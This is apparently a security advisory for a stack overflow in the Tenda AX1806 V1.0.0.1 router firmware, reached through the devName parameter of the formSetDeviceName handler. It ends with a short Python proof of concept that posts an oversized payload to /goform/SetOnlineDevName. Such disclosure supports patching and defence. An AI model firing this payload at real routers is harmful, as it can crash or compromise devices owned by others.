## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3422.html

## Affected version

AX1806 V1.0.0.1

## Vulnerability details

The Tenda AX1806 V1.0.0.1 firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `v3` variable receives the `devName` parameter from a POST request and is passed to function `sub_3CD64`. In this function, `a1` is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `devName` can trigger this security vulnerability.

![image-20240418170516669](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170516669.png)

![image-20240418170614798](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170614798.png)

![image-20240418170623768](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170623768.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*2000

data = {"mac": 1,"devName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240418170641285](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170641285.png)
